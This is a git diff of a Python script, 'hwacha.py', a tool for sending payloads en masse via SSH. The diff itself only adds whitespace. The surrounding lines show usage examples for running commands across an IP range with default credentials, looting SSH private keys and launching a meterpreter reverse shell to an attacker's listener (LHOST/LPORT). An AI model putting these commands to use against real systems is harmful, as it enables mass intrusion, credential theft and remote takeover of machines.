@@ -348,6 +348,7 @@ def make_port(port):
     hex_port += '\\x' + port[2:4].zfill(2)
     return hex_port
 
+
 def examples():
     print 'To run commands, use -x [COMMAND]'
     print 'to run modules, use -m [MODULE]'
@@ -358,6 +359,7 @@ def examples():
     print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -p password -m keys' + CEND
     print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -i loot/keys/192.168.1.101/id_rsa -x id' + CEND
     print CYELLOW + 'python hwacha.py -t 192.168.1.123 -u admin  -p password -m meterpreter -o \"LPORT=4444 LHOST=192.168.1.150 TYPE=64\"' + CEND
+
 
 def print_modules():
     print ""
@@ -384,6 +386,7 @@ def banner():
 &&&&&&&&&&&&&&&                   &&     | | | | \ V  V / (_| | (__| | | | (_| |
              &&                   &&     \_| |_/  \_/\_/ \__,_|\___|_| |_|\__,_| """ + CEND
     return art
+
 
 def main():
     parser = argparse.ArgumentParser(description='Hwacha, a tool for sending payloads en masse via SSH')
